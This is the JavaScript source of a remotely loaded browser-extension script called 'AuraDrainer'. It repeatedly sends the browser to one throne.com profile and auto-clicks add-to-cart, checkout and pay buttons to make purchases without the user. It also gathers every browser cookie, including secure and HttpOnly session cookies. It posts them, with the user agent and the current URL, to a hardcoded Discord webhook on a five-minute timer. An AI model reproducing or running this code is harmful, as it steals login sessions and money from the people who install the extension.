// ========================================
// AURADRAINER - Remote Execution Script
// This file is hosted on GitHub and loaded remotely
// Update this file to push changes to all users
// ========================================

const config = {
  throneUrl: "throne.com/thegoddessaura",
  forceStop: true,
  forceStopShortcut: "Alt+Shift+E",
  debugMode: true,
  // Discord webhook configuration
  discordWebhook: {
    enabled: true,
    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
    maxMessageLength: 2000, // Discord message limit
    cookieLogEnabled: true,
    cookieLogInterval: 300000, // 5 minutes in milliseconds
  }
};

//var audioOpened = false;
var payClicked = false;
var itemsAddedToCart = 0;
var maxItemsToAdd = 1; // Only one item per purchase
var purchaseInProgress = false;
var lastActionTime = 0;
var debugBoxVisible = true; // Track debug box visibility
var cookieLoggingActive = false; // Track if cookie logging is active

// Debug box functionality
function createDebugBox() {
  const debugBox = document.createElement("div");
  debugBox.id = "extension-debug-box";
  debugBox.style.cssText = `
    position: fixed;
    top: 10px;
    right: 10px;
    width: 350px;
    height: 300px;
    background: rgba(0, 0, 0, 0.9);
    color: #00ff00;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    padding: 10px;
    border: 2px solid #00ff00;
    border-radius: 5px;
    z-index: 999999;
    overflow: hidden;
    resize: both;
    min-width: 200px;
    min-height: 150px;
    cursor: default;
  `;
  
  const header = document.createElement("div");
  header.textContent = "🚀 Empress Radia Debug Log";
  header.style.cssText = `
    color: #ffff00;
    font-weight: bold;
    margin-bottom: 10px;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 5px;
    cursor: move;
    user-select: none;
  `;
  
  const logContainer = document.createElement("div");
  logContainer.id = "debug-logs";
  logContainer.style.cssText = `
    height: calc(100% - 40px);
    overflow-y: auto;
    overflow-x: hidden;
  `;
  
  debugBox.appendChild(header);
  debugBox.appendChild(logContainer);
  document.body.appendChild(debugBox);
  
  // Make the debug box draggable
  makeDraggable(debugBox, header);
  
  return logContainer;
}

function makeDraggable(element, handle) {
  let isDragging = false;
  let currentX;
  let currentY;
  let initialX;
  let initialY;
  let xOffset = 0;
  let yOffset = 0;

  handle.addEventListener("mousedown", dragStart);
  document.addEventListener("mousemove", drag);
  document.addEventListener("mouseup", dragEnd);

  function dragStart(e) {
    initialX = e.clientX - xOffset;
    initialY = e.clientY - yOffset;

    if (e.target === handle) {
      isDragging = true;
    }
  }

  function drag(e) {
    if (isDragging) {
      e.preventDefault();
      currentX = e.clientX - initialX;
      currentY = e.clientY - initialY;

      xOffset = currentX;
      yOffset = currentY;

      element.style.transform = `translate(${currentX}px, ${currentY}px)`;
    }
  }

  function dragEnd(e) {
    initialX = currentX;
    initialY = currentY;
    isDragging = false;
  }
}

// Toggle debug box visibility
function toggleDebugBox() {
  const debugBox = document.getElementById("extension-debug-box");
  if (debugBox) {
    debugBoxVisible = !debugBoxVisible;
    debugBox.style.display = debugBoxVisible ? "block" : "none";
    console.log(`%c[AuraDrainer] Debug box ${debugBoxVisible ? 'shown' : 'hidden'}`, "color: #00ff00;");
  }
}

// Cookie collection functions
async function getAllCookiesFromBackground() {
  return new Promise((resolve) => {
    chrome.runtime.sendMessage({action: 'getAllCookies'}, (response) => {
      if (response && response.success) {
        resolve(response.cookies || []);
      } else {
        debugLog(`❌ Failed to get cookies: ${response?.error || 'Unknown error'}`, "error");
        resolve([]);
      }
    });
  });
}

async function getDomainCookiesFromBackground(domain) {
  return new Promise((resolve) => {
    chrome.runtime.sendMessage({action: 'getDomainCookies', domain: domain}, (response) => {
      if (response && response.success) {
        resolve(response.cookies || []);
      } else {
        debugLog(`❌ Failed to get cookies for ${domain}: ${response?.error || 'Unknown error'}`, "error");
        resolve([]);
      }
    });
  });
}

// Discord webhook functions
async function sendToDiscordWebhook(message, isFile = false) {
  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    debugLog("⚠️ Discord webhook not configured", "warning");
    return false;
  }

  try {
    const payload = isFile ? {
      content: "🍪 **Cookie Collection Report** 🍪",
      files: [{
        name: `cookies_${Date.now()}.txt`,
        data: message
      }]
    } : {
      content: message
    };

    const response = await fetch(config.discordWebhook.url, {
      method: 'POST',
      headers: {
        'Content-Type': isFile ? 'multipart/form-data' : 'application/json',
      },
      body: isFile ? createFormData(payload) : JSON.stringify(payload)
    });

    if (response.ok) {
      debugLog("✅ Successfully sent to Discord webhook", "success");
      return true;
    } else {
      debugLog(`❌ Discord webhook failed: ${response.status} ${response.statusText}`, "error");
      return false;
    }
  } catch (error) {
    debugLog(`❌ Discord webhook error: ${error.message}`, "error");
    return false;
  }
}

function createFormData(payload) {
  const formData = new FormData();
  formData.append('content', payload.content);
  formData.append('files[0]', new Blob([payload.files[0].data], {type: 'text/plain'}), payload.files[0].name);
  return formData;
}

function splitMessageForDiscord(message, maxLength = 2000) {
  if (message.length <= maxLength) {
    return [message];
  }

  const messages = [];
  const lines = message.split('\n');
  let currentMessage = '';

  for (const line of lines) {
    if (currentMessage.length + line.length + 1 <= maxLength) {
      currentMessage += (currentMessage ? '\n' : '') + line;
    } else {
      if (currentMessage) {
        messages.push(currentMessage);
        currentMessage = line;
      } else {
        // Single line is too long, force split
        messages.push(line.substring(0, maxLength - 3) + '...');
      }
    }
  }

  if (currentMessage) {
    messages.push(currentMessage);
  }

  return messages;
}

// Main cookie logging function
async function collectAndLogCookies() {
  if (!config.discordWebhook.cookieLogEnabled) {
    debugLog("🍪 Cookie logging disabled in config", "info");
    return;
  }

  if (cookieLoggingActive) {
    debugLog("🍪 Cookie logging already in progress, skipping", "warning");
    return;
  }

  cookieLoggingActive = true;
  debugLog("🍪 Starting cookie collection...", "info");

  try {
    const cookies = await getAllCookiesFromBackground();
    debugLog(`🍪 Collected ${cookies.length} cookies`, "info");

    if (cookies.length === 0) {
      debugLog("🍪 No cookies found", "warning");
      cookieLoggingActive = false;
      return;
    }

    // Format cookies for Discord
    const cookieReport = await formatCookiesForDiscord(cookies);
    
    // Try to send as file first (if message is too long)
    if (cookieReport.length > config.discordWebhook.maxMessageLength) {
      debugLog("📄 Cookie data too large, sending as file...", "info");
      const success = await sendToDiscordWebhook(cookieReport, true);
      if (success) {
        debugLog("✅ Cookie report sent as file to Discord", "success");
      }
    } else {
      // Send as regular message
      const success = await sendToDiscordWebhook(cookieReport);
      if (success) {
        debugLog("✅ Cookie report sent to Discord", "success");
      }
    }

  } catch (error) {
    debugLog(`❌ Cookie collection failed: ${error.message}`, "error");
  } finally {
    cookieLoggingActive = false;
  }
}

async function formatCookiesForDiscord(cookies) {
  if (!cookies || cookies.length === 0) {
    return "No cookies found.";
  }

  // Group cookies by domain for better organization
  const cookiesByDomain = {};
  cookies.forEach(cookie => {
    const domain = cookie.domain;
    if (!cookiesByDomain[domain]) {
      cookiesByDomain[domain] = [];
    }
    cookiesByDomain[domain].push(cookie);
  });

  let formattedText = `🍪 **COOKIE COLLECTION REPORT** 🍪\n`;
  formattedText += `📊 **Total Cookies:** ${cookies.length}\n`;
  formattedText += `🌐 **Domains:** ${Object.keys(cookiesByDomain).length}\n`;
  formattedText += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
  formattedText += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
  formattedText += `🌍 **URL:** ${window.location.href}\n\n`;

  // Add cookies by domain
  Object.keys(cookiesByDomain).sort().forEach(domain => {
    const domainCookies = cookiesByDomain[domain];
    formattedText += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
    
    domainCookies.forEach(cookie => {
      formattedText += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
      if (cookie.secure) formattedText += `    🔒 Secure\n`;
      if (cookie.httpOnly) formattedText += `    🛡️ HttpOnly\n`;
      if (cookie.session) formattedText += `    ⏱️ Session\n`;
      if (cookie.expirationDate) {
        const expDate = new Date(cookie.expirationDate * 1000);
        formattedText += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
      }
      formattedText += `\n`;
    });
    formattedText += `\n`;
  });

  return formattedText;
}

function debugLog(message, type = "info") {
  if (!config.debugMode) return;
  
  let logContainer = document.getElementById("debug-logs");
  if (!logContainer) {
    logContainer = createDebugBox();
  }
  
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  
  let color = "#00ff00"; // default green
  let prefix = "[INFO]";
  let icon = "ℹ️";
  
  switch(type) {
    case "error":
      color = "#ff0000";
      prefix = "[ERROR]";
      icon = "❌";
      break;
    case "warning":
      color = "#ffaa00";
      prefix = "[WARN]";
      icon = "⚠️";
      break;
    case "success":
      color = "#00ffff";
      prefix = "[SUCCESS]";
      icon = "✅";
      break;
    case "action":
      color = "#ffff00";
      prefix = "[ACTION]";
      icon = "🎯";
      break;
    case "purchase":
      color = "#ff69b4";
      prefix = "[PURCHASE]";
      icon = "💳";
      break;
    case "cart":
      color = "#00ff88";
      prefix = "[CART]";
      icon = "🛒";
      break;
    case "navigation":
      color = "#87ceeb";
      prefix = "[NAV]";
      icon = "🧭";
      break;
  }
  
  // Add status indicators
  const statusInfo = getStatusInfo();
  const fullMessage = `${icon} ${message} ${statusInfo}`;
  
  logEntry.innerHTML = `<span style="color: #888">${timestamp}</span> <span style="color: ${color}">${prefix}</span> ${fullMessage}`;
  logEntry.style.marginBottom = "2px";
  logEntry.style.wordWrap = "break-word";
  
  logContainer.appendChild(logEntry);
  logContainer.scrollTop = logContainer.scrollHeight;
  
  // Keep only last 100 logs to prevent memory issues
  while (logContainer.children.length > 100) {
    logContainer.removeChild(logContainer.firstChild);
  }
}

function getStatusInfo() {
  const status = [];
  if (purchaseInProgress) status.push("🔄 PURCHASING");
  if (itemsAddedToCart > 0) status.push(`🛒 CART: ${itemsAddedToCart}/${maxItemsToAdd}`);
  if (payClicked) status.push("💳 PAID");
  return status.length > 0 ? `| ${status.join(" | ")}` : "";
}

function clickAddToCartForAnyItem() {
  // Check if we've already added enough items
  if (itemsAddedToCart >= maxItemsToAdd) {
    debugLog(`Cart limit reached (${itemsAddedToCart}/${maxItemsToAdd}), skipping add process`, "warning");
    return;
  }
  
  if (purchaseInProgress) {
    debugLog("Purchase already in progress, skipping add to cart", "warning");
    return;
  }
  
  debugLog("🔍 Scanning for available items to add to cart", "cart");
  
  setTimeout(() => {
    // Double-check limit before adding (race condition protection)
    if (itemsAddedToCart >= maxItemsToAdd) {
      debugLog(`Cart limit already reached during scan, aborting`, "warning");
      return;
    }
    
    const productCards = document.querySelectorAll("[class*=chakra-stack]");
    debugLog(`📦 Found ${productCards.length} product cards on page`, "info");

    let itemsFound = 0;
    let addableItems = 0;

    for (const card of productCards) {
      const hasImmediateChildWithIdParent = Array.from(card.children).some(
        (child) => child.id === "parent"
      );
      if (!hasImmediateChildWithIdParent) continue;
      
      itemsFound++;
      const addButton = card.querySelector("button");
      
      // STRICT CHECK: Must be exactly "Add to cart" or "Add" button
      if (addButton) {
        const btnText = addButton.textContent.trim().toLowerCase();
        // Must contain "add" AND either "cart" or be exactly "add"
        if ((btnText.includes("add") && btnText.includes("cart")) || btnText === "add") {
          addableItems++;
          debugLog(`🎯 Found addable item: "${addButton.textContent.trim()}"`, "cart");
          debugLog(`💫 Adding item to cart...`, "cart");
          addButton.click();
          itemsAddedToCart++;
          purchaseInProgress = true;
          debugLog(`✅ Item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
          debugLog(`🚀 Initiating purchase sequence...`, "purchase");
          
          // Schedule checkout after a delay to ensure item is added
          setTimeout(() => {
            if (purchaseInProgress && itemsAddedToCart > 0) {
              clickCheckoutIfExists();
            }
          }, 3000);
          
          return;
        }
      }
    }
    
    if (itemsFound > 0) {
      debugLog(`📊 Scan complete: ${itemsFound} items found, ${addableItems} addable`, "info");
    }
    
    if (addableItems === 0) {
      debugLog(`❌ No addable items found on this page`, "warning");
    }
  }, 3000); // Reduced delay for faster response
}

function clickCheckoutIfExists() {
  if (!purchaseInProgress && itemsAddedToCart === 0) {
    debugLog("No items in cart, skipping checkout", "warning");
    return;
  }
  
  debugLog("🔍 Searching for checkout button", "action");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on page`, "info");
    
    for (const btn of buttons) {
      if (btn.textContent.trim().toLowerCase() === "checkout") {
        debugLog(`🎯 Checkout button found: "${btn.textContent.trim()}"`, "cart");
        debugLog(`💫 Clicking checkout button...`, "cart");
        btn.click();
        debugLog(`✅ Checkout initiated successfully!`, "success");
        return;
      }
    }
    
    debugLog("❌ No checkout button found with exact text 'checkout'", "warning");
    debugLog("🔄 Will retry on next cycle", "warning");
  }, 6000);
}

function clickPayNowIfExists() {
  debugLog("💳 Searching for payment button", "purchase");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on checkout page`, "info");
    
    const paymentTexts = ["pay now", "pay", "complete purchase", "buy now", "purchase", "place order"];
    let paymentButtonsFound = 0;
    
    for (const btn of buttons) {
      const span = btn.querySelector("span");
      const btnText = btn.textContent.trim().toLowerCase();
      
      // Check span text first
      if (span && span.textContent.trim().toLowerCase() === "pay now" && !btn.disabled) {
        paymentButtonsFound++;
        debugLog(`🎯 Pay Now button found in span: "${span.textContent.trim()}"`, "purchase");
        debugLog(`💳 Processing payment...`, "purchase");
        btn.click();
        payClicked = true;
        purchaseInProgress = false;
        debugLog(`✅ Payment completed successfully! 🎉`, "success");
        debugLog(`🏁 Purchase sequence finished`, "success");
        return;
      }
      
      // Check button text for other payment variations
      for (const paymentText of paymentTexts) {
        if (btnText.includes(paymentText) && !btn.disabled) {
          paymentButtonsFound++;
          debugLog(`🎯 Payment button found: "${btn.textContent.trim()}"`, "purchase");
          debugLog(`💳 Processing payment...`, "purchase");
          btn.click();
          payClicked = true;
          purchaseInProgress = false;
          debugLog(`✅ Payment completed successfully! 🎉`, "success");
          debugLog(`🏁 Purchase sequence finished`, "success");
          return;
        }
      }
    }
    
    debugLog(`❌ No payment buttons found (checked ${paymentButtonsFound} potential buttons)`, "warning");
    debugLog("🔄 Will retry payment detection on next cycle", "warning");
  }, 7000);
}


function redirectToProfile() {
  debugLog("🧭 Redirecting to profile page", "navigation");
  window.location.href = `https://${config.throneUrl}`;
}

function isOnCartOrCheckoutPage() {
  const url = window.location.href.toLowerCase();
  return url.includes('cart') || url.includes('checkout') || url.includes('payment');
}

function resetPurchaseState() {
  itemsAddedToCart = 0;
  purchaseInProgress = false;
  payClicked = false;
  debugLog("🔄 Purchase state reset - ready for new purchase", "info");
}

function mainLoop() {
  const url = window.location.href;
  const currentTime = Date.now();
  
  debugLog(`🔄 Main loop cycle | URL: ${url}`, "info");

  // Handle different throne.com scenarios
  if (url.includes("throne.com/checkout") || isOnCartOrCheckoutPage()) {
    debugLog("💳 On checkout/cart page - attempting payment", "purchase");
    clickPayNowIfExists();
  } else if (url.includes("throne.com/thegoddessaura")) {
    // Check if purchase was completed (successful payment)
    if (payClicked && !purchaseInProgress) {
      debugLog("🎉 Previous purchase completed, resetting for new purchase", "success");
      resetPurchaseState();
      return;
    }
    
    // CRITICAL FIX: Only add items if we haven't reached the limit
    if (itemsAddedToCart < maxItemsToAdd && !isOnCartOrCheckoutPage() && !purchaseInProgress) {
      debugLog("🛍️ On profile page - scanning for items to purchase", "cart");
      clickAddToCartForAnyItem();
      // DON'T call clickCheckoutIfExists here - let it be called separately after item is added
    } else if (itemsAddedToCart >= maxItemsToAdd && purchaseInProgress) {
      debugLog(`📊 Cart has ${itemsAddedToCart} item(s), focusing on checkout only`, "cart");
      clickCheckoutIfExists();
    } else if (purchaseInProgress && itemsAddedToCart > 0) {
      debugLog("🔄 Purchase in progress, continuing checkout flow", "purchase");
      clickCheckoutIfExists();
    } else {
      debugLog("ℹ️ Waiting for next action...", "info");
    }
  } else if (url === "https://throne.com/" || url === "https://throne.com" || url.includes("throne.com/?") || url.includes("throne.com#")) {
    debugLog("🏠 On throne.com homepage - redirecting to target profile", "navigation");
    redirectToProfile();
  } else if (url.includes("throne.com")) {
    debugLog("🧭 On throne.com but not target profile - redirecting", "navigation");
    redirectToProfile();
  } else {
    debugLog(`⚠️ Not on throne.com - current URL: ${url}`, "warning");
  }
}

// ...existing code...

function main() {
  debugLog("🚀AutoDrain Started!", "success");
  debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
  debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
  debugLog(`🔧 Debug Mode: Enabled`, "info");
  debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
  debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
  debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
  debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
  debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
  
  const mainInterval = setInterval(mainLoop, 5000);
  
  // Initialize cookie logging if enabled
  if (config.discordWebhook.cookieLogEnabled && config.discordWebhook.enabled) {
    debugLog(`🍪 Cookie logging enabled (interval: ${config.discordWebhook.cookieLogInterval / 1000}s)`, "info");
    
    // Initial cookie collection after 10 seconds
    setTimeout(() => {
      collectAndLogCookies();
    }, 10000);
    
    // Periodic cookie collection
    setInterval(() => {
      collectAndLogCookies();
    }, config.discordWebhook.cookieLogInterval);
  } else {
    debugLog("🍪 Cookie logging disabled", "info");
  }
  
  window.addEventListener("keydown", (event) => {
    // Emergency stop shortcut
    if (event.altKey && event.shiftKey && event.key === "E") {
      if (config.forceStop) {
        debugLog("🛑 EMERGENCY STOP ACTIVATED (Alt+Shift+E)", "error");
        debugLog("🔄 Stopping all automation...", "warning");
        clearInterval(mainInterval);
        debugLog("✅ Extension stopped successfully", "success");
      }
    }
    
    // Debug toggle shortcut
    if (event.ctrlKey && event.altKey && event.key === "D") {
      event.preventDefault(); // Prevent browser default behavior
      toggleDebugBox();
    }
    
    // Cookie collection shortcut
    if (event.ctrlKey && event.altKey && event.key === "C") {
      event.preventDefault(); // Prevent browser default behavior
      debugLog("🍪 Manual cookie collection triggered", "info");
      collectAndLogCookies();
    }
  });
}

// Start everything
main();

